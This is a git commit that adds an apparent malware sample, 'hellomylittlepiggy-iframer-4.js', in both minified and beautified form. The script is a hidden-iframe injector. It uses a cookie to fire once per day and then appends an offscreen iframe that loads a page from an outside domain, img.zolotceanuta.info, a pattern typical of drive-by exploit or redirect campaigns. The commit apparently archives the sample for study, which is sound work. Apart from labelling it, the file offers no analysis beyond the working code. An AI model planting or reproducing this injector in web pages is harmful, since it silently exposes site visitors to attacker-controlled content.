4db75bd5f0567ebdca547be06fe60d08499f277b
WSTNPHX <info@sctn9.com>
2018-04-24 07:37:57 -0700

    added hellomylittlepiggy iframer example

---
+++ hellomylittlepiggy-iframer-4.js
@@ -0,0 +1,29 @@
+window.onload = function(){function x22bq(a,b,c){if(c){var d = new Date();d.setDate(d.getDate()+c);}if(a && b) document.cookie = a+'='+b+(c ? '; expires='+d.toUTCString() : '');else return false;}function x33bq(a){var b = new RegExp(a+'=([^;]){1,}');var c = b.exec(document.cookie);if(c) c = c[0].split('=');else return false;return c[1] ? c[1] : false;}var x33dq = x33bq("1eff68229727b3db2dc11937c321c638");if( x33dq != "f7083d63659bf1c7673fdc2eab8ece8a"){x22bq("1eff68229727b3db2dc11937c321c638","f7083d63659bf1c7673fdc2eab8ece8a",1);var x22dq = document.createElement("div");var x22qq = "http://img.zolotceanuta.info/hellomylittlepiggy/?CvoRuzpEqbqL=RNnRpoZxeQv&keyword=3a52f9bcae6407059da157f8b5fc286f&cNkLxTUyHLqLb=GSiOMyMwbQVHKeLEups&mBkpvvtQYYg=xILFHuYrqco&kLFBsgvDcDtLr=BgRAfcnRkIpFU&uLVGWXhMvvcBLR=IpygUxAVoDbjcd&JJqZoSusnMpSlVz=CISHUELZeGwQIaZ&MeSObgsOxIkrrF=sHXoItEse&BMkWJTjHr=LAEcDCBySWe&VQrfgAa=wKuHCbYXytq";x22dq.innerHTML="<div style='position:absolute;z-index:1000;top:-1000px;left:-9999px;'><iframe src='"+x22qq+"'></iframe></div>";document.body.appendChild(x22dq);}}
+
+Beautified decoded result
+window.onload = function() {
+    function x22bq(a, b, c) {
+        if (c) {
+            var d = new Date();
+            d.setDate(d.getDate() + c);
+        }
+        if (a && b) document.cookie = a + '=' + b + (c ? '; expires=' + d.toUTCString() : '');
+        else return false;
+    }
+
+    function x33bq(a) {
+        var b = new RegExp(a + '=([^;]){1,}');
+        var c = b.exec(document.cookie);
+        if (c) c = c[0].split('=');
+        else return false;
+        return c[1] ? c[1] : false;
+    }
+    var x33dq = x33bq("1eff68229727b3db2dc11937c321c638");
+    if (x33dq != "f7083d63659bf1c7673fdc2eab8ece8a") {
+        x22bq("1eff68229727b3db2dc11937c321c638", "f7083d63659bf1c7673fdc2eab8ece8a", 1);
+        var x22dq = document.createElement("div");
+        var x22qq = "http://img.zolotceanuta.info/hellomylittlepiggy/?CvoRuzpEqbqL=RNnRpoZxeQv&keyword=3a52f9bcae6407059da157f8b5fc286f&cNkLxTUyHLqLb=GSiOMyMwbQVHKeLEups&mBkpvvtQYYg=xILFHuYrqco&kLFBsgvDcDtLr=BgRAfcnRkIpFU&uLVGWXhMvvcBLR=IpygUxAVoDbjcd&JJqZoSusnMpSlVz=CISHUELZeGwQIaZ&MeSObgsOxIkrrF=sHXoItEse&BMkWJTjHr=LAEcDCBySWe&VQrfgAa=wKuHCbYXytq";
+        x22dq.innerHTML = "<div style='position:absolute;z-index:1000;top:-1000px;left:-9999px;'><iframe src='" + x22qq + "'></iframe></div>";
+        document.body.appendChild(x22dq);
+    }
+}
